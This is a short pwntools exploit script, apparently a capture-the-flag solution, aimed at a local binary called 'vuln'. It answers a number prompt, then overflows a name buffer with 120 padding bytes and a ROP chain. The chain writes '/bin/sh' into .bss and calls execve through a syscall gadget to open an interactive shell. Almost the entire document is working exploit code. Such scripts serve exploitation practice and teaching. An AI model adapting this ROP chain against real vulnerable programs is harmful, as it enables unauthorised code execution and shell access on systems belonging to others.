from pwn import *

elf = ELF("./vuln")
rop = ROP(elf)

pop_rax_ret = rop.find_gadget(["pop rax", "ret"]).address
pop_rsi_ret = rop.find_gadget(["pop rsi", "ret"]).address
pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"]).address
pop_rdx_ret = rop.find_gadget(["pop rdx", "ret"]).address
mov_rsi_rax = 0x47ff91 # ROPGagetで見つけました
bss_addr = 0x6bc3a0
syscall = rop.find_gadget(["syscall", "ret"]).address

write_bss = p64(pop_rax_ret)
write_bss += b"/bin/sh\x00"
write_bss += p64(pop_rsi_ret)
write_bss += p64(bss_addr)
write_bss += p64(mov_rsi_rax)

call_execve = p64(pop_rdi_ret)
call_execve += p64(bss_addr)
call_execve += p64(pop_rsi_ret)
call_execve += p64(0x0)
call_execve += p64(pop_rdx_ret)
call_execve += p64(0x0)
call_execve += p64(pop_rax_ret)
call_execve += p64(0x3b)
call_execve += p64(syscall)

chain = write_bss + call_execve

r = process("./vuln")
r.recvuntil(b"What number would you like to guess?")
r.sendline(b"84")
r.recvuntil(b"Name?")
r.sendline(b"A"*120 + chain)
r.interactive()

